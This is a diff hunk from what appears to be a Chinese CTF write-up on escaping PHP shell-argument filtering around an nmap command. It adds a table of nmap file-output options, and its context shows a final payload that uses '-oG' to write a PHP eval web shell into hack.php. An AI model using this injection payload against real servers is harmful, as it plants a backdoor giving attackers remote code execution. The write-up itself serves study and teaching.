@@ -214,6 +214,9 @@
 
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">\\会被解析成一个\两个连续的单引号会被解析成一个空白</span><br><span class="line">如果我们输入的是</span><br><span class="line">1&#x27;命令&#x27;</span><br><span class="line">那么就会变成</span><br><span class="line">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F&quot; . &#x27;127.0.0.1&#x27;\\&#x27;&#x27; 命令 &#x27;\\&#x27;&#x27;&#x27;</span><br><span class="line">也就是</span><br><span class="line">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F&quot; . &#x27;127.0.0.1&#x27; 命令 \</span><br><span class="line">我们输入的命令就会被nmap解析成条件，我们就可以写入一个nmap写文件参数执行。</span><br></pre></td></tr></table></figure>
 
+<p>附上nmap的利用参数：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">选项 解释</span><br><span class="line">-oN 标准保存</span><br><span class="line">-oX XML保存</span><br><span class="line">-oG Grep保存</span><br><span class="line">-oA 保存到所有格式</span><br><span class="line">-append-output 补充保存文件</span><br></pre></td></tr></table></figure>
+
 <p>最终payload：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; &lt;?php eval($_POST[&quot;a&quot;]); ?&gt; -oG hack.php &#x27;</span><br></pre></td></tr></table></figure>
 
